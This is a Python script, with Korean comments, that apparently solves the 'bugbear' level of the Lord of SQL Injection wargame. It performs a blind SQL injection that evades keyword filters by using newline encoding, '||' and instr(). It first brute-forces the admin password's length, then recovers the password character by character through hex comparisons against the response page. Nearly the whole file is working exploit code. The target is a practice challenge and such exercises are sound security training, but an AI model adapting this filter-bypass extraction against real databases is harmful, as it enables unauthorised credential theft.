import urllib3
import requests

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"

length = 0

for i in range(0,15):
    #query = "no=1%0a||%0aid%0ain%0a(%22admin%22)%26%26length(pw)>{}%26%26length(pw)<{}%23".format(i, i+2)
    #query = f"no=1%0a||instr(id,char(97,100,109,105,110))%26%26instr(length(pw),{i})%23"
    #query = f"no=1%0a||instr(id,\"admin\")%26%26instr(length(pw),{i})"
    query = "no=1%0a||instr(id,\"admin\")%26%26instr(length(pw),{})".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    #print(req.text)
    if "Hello admin" in req.text:
        length = i
        break

print(length)

ans=''
for i in range(1, length+1):
    for j in ch:
        query = "no=1%0a||instr(id,\"admin\")%26%26hex(mid(pw,{},1))%0ain%0a(hex({}))%23".format(i, ord(j))
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "Hello admin" in req.text:
            print("[+] find password letter is {}".format(j))
            print("the letter is {}".format(i))
            ans += j
            break

print(ans)

#이상하게 copy and paste 하면 header의 PHPSESSID가 날아가는 문제 발생
#query문 앞에 f를 넣어야 format입력을 한다.(세번 째 주석문 내용)
#like 대신 instr을 사용한 것이다.

#hex값 쓸 때 (hex({}))이렇게 괄호 안에 제대로 넣어줘야 동작한다.
#여기 많이 참고 https://g-idler.tistory.com/53



